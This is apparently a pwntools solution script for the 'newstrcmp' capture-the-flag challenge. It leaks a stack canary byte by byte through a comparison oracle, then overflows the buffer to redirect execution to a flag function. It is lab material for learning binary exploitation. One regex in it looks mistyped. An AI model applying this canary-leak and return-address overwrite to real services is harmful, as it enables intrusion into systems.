from pwn import *
import re # 꼴받네;;

context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
e = ELF("./newstrcmp")

HOST, PORT = "host8.dreamhack.games 11328".split()

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = process("./newstrcmp")

flag = e.sym["flag"] # NO PIE. yuh uh.

'''
int v4; // [rsp+10h] [rbp-50h]
  int v5; // [rsp+14h] [rbp-4Ch] BYREF
  int v6; // [rsp+18h] [rbp-48h]
  _BYTE buf[2]; // [rsp+1Eh] [rbp-42h] BYREF
  _BYTE v8[16]; // [rsp+20h] [rbp-40h] BYREF
  __int64 v9; // [rsp+30h] [rbp-30h]
  __int64 v10; // [rsp+38h] [rbp-28h]
  _BYTE v11[24]; // [rsp+40h] [rbp-20h] BYREF
  unsigned __int64 v12; // [rsp+58h] [rbp-8h]
'''

# 두 배열 다 카나리를 포함해야함.

def newstrcmp(i, guess):
    p.sendafter(b'(y/n): ', b'n')
    p.sendafter(b's1: ', b'A'*i + bytes([guess]))
    p.sendafter(b's2: ', b'A'*i)

    line = p.recvline()
    a = re.search(rb'first differs at (\%d+)', line)
    idx = int(a.group(1)) if a else None

    if idx is not None and idx > i:
        return 0

    if b'smaller' in line:
        return -1
    elif b'larger' in line:
        return 1
    else:
        return 0


cnry = b''

for i in range(24, 32):
    lo, hi = 0, 255

    while lo <= hi:
        mid = (lo + hi) // 2
        r = newstrcmp(i, mid)

        if r == 0:
            cnry += bytes([mid])
            break
        elif r < 0:
            lo = mid + 1
        else:
            hi = mid - 1
    else:
        cnry += bytes([hi])

    success(f'canary[{i-24}] = {cnry[-1]:#x}')


cnry = cnry[:-1] + bytes([(cnry[-1] + 1) & 0xff])

pay = b'A'*24 + cnry + b'B'*0x8 + p64(flag)
p.sendafter(b'(y/n): ', b'n')
p.sendafter(b's1', b'a')
p.sendafter(b's2', pay)

# gdb.attach(p)
# pause()

p.sendafter(b'n): ', b'y')

p.interactive()